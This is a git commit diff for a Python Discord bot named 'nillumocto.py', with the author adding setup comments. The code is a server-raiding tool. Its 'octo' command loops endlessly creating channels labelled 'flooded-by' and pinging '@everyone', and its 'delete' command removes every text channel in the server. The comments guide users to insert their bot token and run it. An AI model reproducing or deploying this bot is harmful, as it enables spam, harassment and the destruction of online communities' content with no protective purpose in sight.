cbd0cda76e76f1b20e54c074c585591986d3c1ab
Kamushy <92086533+Kamushy@users.noreply.github.com>
2022-03-24 19:47:00 +1100

    comments for user friendlyness

--- nillumocto.py
+++ nillumocto.py
@@ -1,13 +1,18 @@
+#by kamushy
+#read github description 
 import discord
 from discord.ext import commands
 
 client = commands.Bot(command_prefix=".")
+
+#read github description 
 
 @client.command()
 async def octo(ctx):
     guild = ctx.guild
     username = ctx.message.author.name
     
+    #Enter file path in the ''
     await ctx.send(file=discord.File(r'enter you file path here'))
     while 1 == 1:
         channel = await guild.create_text_channel(f"flooded-by, {username}")
@@ -17,11 +22,13 @@ async def octo(ctx):
         await channel.send(embed = em)
         await channel.send("@everyone")
 
+#dont need to change this
 @client.command()
 async def delete(ctx):
     await ctx.reply("Channels deleting now, as you wish")
     guild = ctx.guild
     for channel in guild.text_channels:
         await channel.delete()
-             
+
+#Add token here, read github description if confused
 client.run('add your token here')
